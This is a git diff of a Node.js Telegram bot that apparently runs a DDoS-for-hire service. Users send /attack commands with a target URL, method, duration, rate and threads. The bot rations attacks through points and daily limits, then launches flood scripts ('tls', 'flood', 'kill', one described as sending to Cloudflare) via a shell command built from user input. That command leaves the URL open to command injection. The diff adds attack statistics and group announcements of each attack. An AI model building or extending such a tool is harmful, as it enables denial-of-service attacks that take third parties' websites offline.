@@ -8,20 +8,19 @@ const bot = new TelegramBot(token, { polling: true });
 const admins = [6601930239];
 const subAdmins = [7245377580, 7566935490];
 const groupId = -1002370415846;
-const requiredGroup = "@deptraiaiyeu";
-const requiredChannel = "@vxkdepchai";
+const requiredGroup = -1002370415846;
+const requiredChannel = -1002511070831;
 const methods = ["tls", "flood", "kill"];
 const db = Database("bot.db");
 
 const messages = {
     vi: {
-        start: `**Lệnh của Bot:**\n• /methods -> Xem danh sách methods\n• /attack [url] [method] [time] [-r rate] [-t threads]\n• /blacklist [add/remove] [keyword] (admin only)\n• /maintenance -> Bật hoặc tắt chức năng bảo trì Bot (admin only)\n• /ongoing -> Xem slot đang hoạt động\n• /system -> Xem thông tin hệ thống\n• /daily -> Điểm danh nhận 300 điểm\n• /balance -> Xem số điểm hiện có`,
+        start: `**Lệnh của Bot:**\n• /methods -> Xem danh sách methods\n• /attack [url] [method] [time] [-r rate] [-t threads]\n• /blacklist [add/remove] [keyword] (admin only)\n• /maintenance -> Bật hoặc tắt chức năng bảo trì Bot (admin only)\n• /ongoing -> Xem slot đang hoạt động\n• /system -> Xem thông tin hệ thống\n• /daily -> Điểm danh nhận 300 điểm\n• /stats -> Xem thống kê sử dụng bot`,
         methods: `**Method hiện có:**\n• tls -> Send cloudflare\n• flood -> Bản v1, requests ổn\n• kill -> Mạnh nhưng no bypass`,
-        notMember: `Bạn cần tham gia nhóm ${requiredGroup} và kênh ${requiredChannel} để sử dụng bot!`,
+        notMember: `Bạn cần tham gia nhóm và kênh để sử dụng bot!`,
         adminNoCheckin: "Admin và SubAdmin không cần điểm danh!",
         alreadyCheckedIn: "Bạn đã điểm danh hôm nay rồi!",
         checkinSuccess: "Đã cộng 300 điểm cho bạn.\nSố điểm hiện tại: {points}",
-        balance: "**Số điểm của bạn:** {points}",
         noPermission: "Bạn không có quyền sử dụng lệnh này.",
         blacklistCurrent: "**Blacklist hiện tại:**\n{list}",
         blacklistEmpty: "Không có keyword nào.",
@@ -41,22 +40,21 @@ const messages = {
         notEnoughPoints: "Bạn không đủ điểm để thực hiện attack. Cần ít nhất 100 điểm.",
         noSlotsAvailable: "Hiện không còn slot trống, vui lòng thử lại sau.",
         cooldownWait: "Vui lòng đợi {seconds}s trước khi gửi attack tiếp theo.",
-        attackSent: "**Attack sent!**\n\n**URL:** `{url}`\n**Method:** `{method}`\n**Thời gian:** `{time}s`\n**Rate:** `{rate}`\n**Threads:** `{threads}`{pointsText}",
-        remainingPoints: "\n**Điểm còn lại:** `{points}`",
-        remainingAttacks: "\n**Lượt attack còn lại hôm nay:** `{attacks}`",
+        attackSent: "**Attack sent!**\n\n**URL:** `{url}`\n**Method:** `{method}`\n**Thời gian:** `{time}s`\n**Rate:** `{rate}`\n**Threads:** `{threads}`",
         slotCompleted: "Đã có slot mới.\nSố slot hiện tại: {active}/{max}.",
         error: "Lỗi: `{error}`",
         completed: "Hoàn thành!\n```\n{output}\n```",
-        systemInfo: "**System Information:**\n\n**CPU:** {cpu}\n**OS Name:** {os}\n**Total RAM:** {totalRam} GB\n**Free RAM:** {freeRam} GB\n**Used Disk:** {usedDisk} GB\n**Total Disk:** {totalDisk} GB"
+        systemInfo: "**System Information:**\n\n**CPU:** {cpu}\n**OS Name:** {os}\n**Total RAM:** {totalRam} GB\n**Free RAM:** {freeRam} GB\n**Used Disk:** {usedDisk} GB\n**Total Disk:** {totalDisk} GB",
+        stats: "**Thống kê lượt sử dụng Bot:**\n{list}",
+        attackNotification: "{fullName} Sent Attack\n**Method:** {method}\n**Rate:** {rate}\n**Thread:** {threads}\n**Time:** {time}s\n**Slot:** {slot}"
     },
     en: {
-        start: `**Bot Commands:**\n• /methods -> View available methods\n• /attack [url] [method] [time] [-r rate] [-t threads]\n• /blacklist [add/remove] [keyword] (admin only)\n• /maintenance -> Toggle bot maintenance mode (admin only)\n• /ongoing -> View active slots\n• /system -> View system information\n• /daily -> Daily check-in for 300 points\n• /balance -> View current points`,
+        start: `**Bot Commands:**\n• /methods -> View available methods\n• /attack [url] [method] [time] [-r rate] [-t threads]\n• /blacklist [add/remove] [keyword] (admin only)\n• /maintenance -> Toggle bot maintenance mode (admin only)\n• /ongoing -> View active slots\n• /system -> View system information\n• /daily -> Daily check-in for 300 points\n• /stats -> View bot usage statistics`,
         methods: `**Available Methods:**\n• tls -> Send cloudflare\n• flood -> Version 1, stable requests\n• kill -> Powerful but no bypass`,
-        notMember: `You need to join group ${requiredGroup} and channel ${requiredChannel} to use this bot!`,
+        notMember: `You need to join group and channel to use this bot!`,
         adminNoCheckin: "Admins and SubAdmins don't need daily check-in!",
         alreadyCheckedIn: "You have already checked in today!",
         checkinSuccess: "Added 300 points to your account.\nCurrent points: {points}",
-        balance: "**Your points:** {points}",
         noPermission: "You don't have permission to use this command.",
         blacklistCurrent: "**Current Blacklist:**\n{list}",
         blacklistEmpty: "No keywords found.",
@@ -76,20 +74,20 @@ const messages = {
         notEnoughPoints: "You don't have enough points to perform attack. Need at least 100 points.",
         noSlotsAvailable: "No slots available, please try again later.",
         cooldownWait: "Please wait {seconds}s before sending next attack.",
-        attackSent: "**Attack sent!**\n\n**URL:** `{url}`\n**Method:** `{method}`\n**Time:** `{time}s`\n**Rate:** `{rate}`\n**Threads:** `{threads}`{pointsText}",
-        remainingPoints: "\n**Remaining points:** `{points}`",
-        remainingAttacks: "\n**Remaining attacks today:** `{attacks}`",
+        attackSent: "**Attack sent!**\n\n**URL:** `{url}`\n**Method:** `{method}`\n**Time:** `{time}s`\n**Rate:** `{rate}`\n**Threads:** `{threads}`",
         slotCompleted: "New slot available.\nCurrent slots: {active}/{max}.",
         error: "Error: `{error}`",
         completed: "Completed!\n```\n{output}\n```",
-        systemInfo: "**System Information:**\n\n**CPU:** {cpu}\n**OS Name:** {os}\n**Total RAM:** {totalRam} GB\n**Free RAM:** {freeRam} GB\n**Used Disk:** {usedDisk} GB\n**Total Disk:** {totalDisk} GB"
+        systemInfo: "**System Information:**\n\n**CPU:** {cpu}\n**OS Name:** {os}\n**Total RAM:** {totalRam} GB\n**Free RAM:** {freeRam} GB\n**Used Disk:** {usedDisk} GB\n**Total Disk:** {totalDisk} GB",
+        stats: "**Bot Usage Statistics:**\n{list}",
+        attackNotification: "{fullName} Sent Attack\n**Method:** {method}\n**Rate:** {rate}\n**Thread:** {threads}\n**Time:** {time}s\n**Slot:** {slot}"
     }
 };
 
 db.exec(`CREATE TABLE IF NOT EXISTS settings (key TEXT PRIMARY KEY, value TEXT);
 CREATE TABLE IF NOT EXISTS blacklist (keyword TEXT PRIMARY KEY);
 CREATE TABLE IF NOT EXISTS slots (userId INTEGER, url TEXT, method TEXT, endTime INTEGER, fullName TEXT, PRIMARY KEY(userId, url, method));
-CREATE TABLE IF NOT EXISTS users (userId INTEGER PRIMARY KEY, points INTEGER DEFAULT 0, lastCheckin TEXT, attacksToday INTEGER DEFAULT 0, lastAttackDate TEXT, language TEXT DEFAULT 'vi');`);
+CREATE TABLE IF NOT EXISTS users (userId INTEGER PRIMARY KEY, points INTEGER DEFAULT 0, lastCheckin TEXT, attacksToday INTEGER DEFAULT 0, lastAttackDate TEXT, language TEXT DEFAULT 'vi', totalAttacks INTEGER DEFAULT 0);`);
 
 const getSetting = db.prepare("SELECT value FROM settings WHERE key=?");
 const setSetting = db.prepare("INSERT OR REPLACE INTO settings (key, value) VALUES (?, ?)");
@@ -101,11 +99,13 @@ const addSlot = db.prepare("INSERT INTO slots (userId, url, method, endTime, ful
 const removeSlot = db.prepare("DELETE FROM slots WHERE userId=? AND url=? AND method=?");
 const removeExpiredSlots = db.prepare("DELETE FROM slots WHERE endTime <= ?");
 const getUser = db.prepare("SELECT * FROM users WHERE userId=?");
-const addUser = db.prepare("INSERT OR IGNORE INTO users (userId, points, lastCheckin, attacksToday, lastAttackDate, language) VALUES (?, 0, '', 0, '', 'vi')");
+const addUser = db.prepare("INSERT OR IGNORE INTO users (userId, points, lastCheckin, attacksToday, lastAttackDate, language, totalAttacks) VALUES (?, 0, '', 0, '', 'vi', 0)");
 const updateUserPoints = db.prepare("UPDATE users SET points=? WHERE userId=?");
 const updateUserCheckin = db.prepare("UPDATE users SET lastCheckin=? WHERE userId=?");
 const updateUserAttacks = db.prepare("UPDATE users SET attacksToday=?, lastAttackDate=? WHERE userId=?");
 const updateUserLanguage = db.prepare("UPDATE users SET language=? WHERE userId=?");
+const incrementTotalAttacks = db.prepare("UPDATE users SET totalAttacks = totalAttacks + 1 WHERE userId=?");
+const getTopUsers = db.prepare("SELECT userId, totalAttacks FROM users WHERE totalAttacks > 0 ORDER BY totalAttacks DESC LIMIT 20");
 
 if (!getSetting.get("maintenance")) setSetting.run("maintenance", "false");
 if (!getSetting.get("activeSlots")) setSetting.run("activeSlots", "0");
@@ -164,8 +164,8 @@ async function checkMembership(userId) {
     
     try {
         const [groupMember, channelMember] = await Promise.all([
-            bot.getChatMember(requiredGroup, userId).catch(() => null),
-            bot.getChatMember(requiredChannel, userId).catch(() => null)
+            bot.getChatMember(requiredGroup, userId).catch(err => null),
+            bot.getChatMember(requiredChannel, userId).catch(err => null)
         ]);
         
         const isGroupMember = groupMember && ['member', 'administrator', 'creator'].includes(groupMember.status);
@@ -173,7 +173,6 @@ async function checkMembership(userId) {
         
         return isGroupMember && isChannelMember;
     } catch (error) {
-        console.error('Membership check error:', error);
         return false;
     }
 }
@@ -201,10 +200,8 @@ bot.onText(/\/start/, async (msg) => {
     const userId = msg.from.id;
     
     if (!(await isAllowed(chatId, userId))) {
-        if (!isAdmin(userId) && !isSubAdmin(userId)) {
-            bot.sendMessage(chatId, getMessage(userId, 'notMember'), { parse_mode: "Markdown" });
-            return;
-        }
+        bot.sendMessage(chatId, getMessage(userId, 'notMember'), { parse_mode: "Markdown" });
+        return;
     }
     
     addUser.run(userId);
@@ -269,7 +266,7 @@ bot.onText(/\/daily/, async (msg) => {
     bot.sendMessage(chatId, getMessage(userId, 'checkinSuccess', { points: newPoints }), { parse_mode: "Markdown" });
 });
 
-bot.onText(/\/balance/, async (msg) => {
+bot.onText(/\/stats/, async (msg) => {
     const chatId = msg.chat.id;
     const userId = msg.from.id;
     
@@ -278,9 +275,25 @@ bot.onText(/\/balance/, async (msg) => {
         return;
     }
     
-    addUser.run(userId);
-    const user = getUser.get(userId);
-    bot.sendMessage(chatId, getMessage(userId, 'balance', { points: user.points }), { parse_mode: "Markdown" });
+    const topUsers = getTopUsers.all();
+    let statsText = "";
+    
+    if (topUsers.length === 0) {
+        statsText = "Chưa có thống kê nào.";
+    } else {
+        for (let i = 0; i < topUsers.length; i++) {
+            const user = topUsers[i];
+            try {
+                const chatMember = await bot.getChatMember(groupId, user.userId);
+                const fullName = getFullName(chatMember.user);
+                statsText += `${i + 1}. ${fullName} - ${user.totalAttacks} lần\n`;
+            } catch (error) {
+                statsText += `${i + 1}. Unknown User - ${user.totalAttacks} lần\n`;
+            }
+        }
+    }
+    
+    bot.sendMessage(chatId, getMessage(userId, 'stats', { list: statsText }), { parse_mode: "Markdown" });
 });
 
 bot.onText(/\/blacklist(?:\s+)?$/, (msg) => {
@@ -431,8 +444,10 @@ bot.onText(/\/attack (.+?) (tls|flood|kill) (\d+)(?:\s+-r\s+(\d+))?(?:\s+-t\s+(\
         return;
     }
     
+    let slotInfo = "";
+    
     if (isAdmin(userId)) {
-        
+        slotInfo = "Unlimited";
     } else if (isSubAdmin(userId)) {
         if (time > 260) time = 260;
         if (user.lastAttackDate === today && user.attacksToday >= 10) {
@@ -441,6 +456,8 @@ bot.onText(/\/attack (.+?) (tls|flood|kill) (\d+)(?:\s+-r\s+(\d+))?(?:\s+-t\s+(\
         }
         rate = 17;
         threads = 5;
+        const remainingAttacks = user.lastAttackDate === today ? 10 - user.attacksToday : 10;
+        slotInfo = `${remainingAttacks - 1}/10`;
     } else {
         if (time > 60) time = 60;
         if (user.points < 100) {
@@ -449,6 +466,8 @@ bot.onText(/\/attack (.+?) (tls|flood|kill) (\d+)(?:\s+-r\s+(\d+))?(?:\s+-t\s+(\
         }
         rate = 17;
         threads = 5;
+        const remainingPoints = Math.floor((user.points - 100) / 100);
+        slotInfo = `${remainingPoints} attacks`;
     }
     
     syncSlotsFromDb();
@@ -473,6 +492,8 @@ bot.onText(/\/attack (.+?) (tls|flood|kill) (\d+)(?:\s+-r\s+(\d+))?(?:\s+-t\s+(\
         updateUserAttacks.run(newAttackCount, today, userId);
     }
     
+    incrementTotalAttacks.run(userId);
+    
     const endTime = Math.floor(now / 1000) + time;
     const fullName = getFullName(msg.from);
     addSlot.run(userId, url, method, endTime, fullName);
@@ -480,22 +501,24 @@ bot.onText(/\/attack (.+?) (tls|flood|kill) (\d+)(?:\s+-r\s+(\d+))?(?:\s+-t\s+(\
     setSetting.run("activeSlots", activeSlots.toString());
     lastAttackTime = now;
     
-    let pointsText = "";
-    if (!isAdmin(userId) && !isSubAdmin(userId)) {
-        pointsText = getMessage(userId, 'remainingPoints', { points: user.points - 100 });
-    } else if (isSubAdmin(userId)) {
-        const newAttackCount = user.lastAttackDate === today ? user.attacksToday + 1 : 1;
-        pointsText = getMessage(userId, 'remainingAttacks', { attacks: 10 - newAttackCount });
-    }
-    
     bot.sendMessage(chatId, getMessage(userId, 'attackSent', {
         url,
         method,
         time,
         rate,
-        threads,
-        pointsText
+        threads
     }), { parse_mode: "Markdown" });
+    
+    if (!isAdmin(userId)) {
+        bot.sendMessage(groupId, getMessage(userId, 'attackNotification', {
+            fullName,
+            method,
+            rate,
+            threads,
+            time,
+            slot: slotInfo
+        }), { parse_mode: "Markdown" });
+    }
     
     exec(`node ${method}.js ${url} ${time} ${rate} ${threads} proxy.txt`, (error, stdout, stderr) => {
         removeSlot.run(userId, url, method);
